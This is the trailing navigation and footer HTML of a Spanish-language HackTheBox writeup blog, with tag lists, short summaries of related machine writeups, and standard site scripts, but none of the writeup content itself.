[ES] - HackTheBox - brsalcedom" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/BountyHunter-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1637956800" > 2021-11-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> BountyHunter es una máquina Linux de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup indicando la forma de como rootearla. Información ...</p></div></div></a></div><div class="card"> <a href="/Mango-Writeup-HackTheBox/"><div class="card-body"> <em class="timeago small" data-ts="1639584000" > 2021-12-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Mango Writeup [ES] - HackTheBox</h3><div class="text-muted small"><p> Mango es una máquina Linux de dificultad media ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un writeup de su resolución. Información Esta box introduce concepto...</p></div></div></a></div><div class="card"> <a href="/Wekor-Writeup-TryHackMe/"><div class="card-body"> <em class="timeago small" data-ts="1622995200" > 2021-06-06 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Wekor Writeup [ES] - TryHackMe</h3><div class="text-muted small"><p> Wekor es un room de TryHackMe de dificultad media en donde se repasan conceptos de SQLi y Path Hijacking. Involucra explotación de WordPress, Virtual Hosting y una buena cantidad de enumeración. D...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Active-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Older"><p>Active Writeup [ES] - HackTheBox</p></a> <a href="/Sauna-Writeup-HackTheBox/" class="btn btn-outline-primary" prompt="Newer"><p>Sauna Writeup [ES] - HackTheBox</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/jenkins/">jenkins</a> <a class="post-tag" href="/tags/kerberoasting/">kerberoasting</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
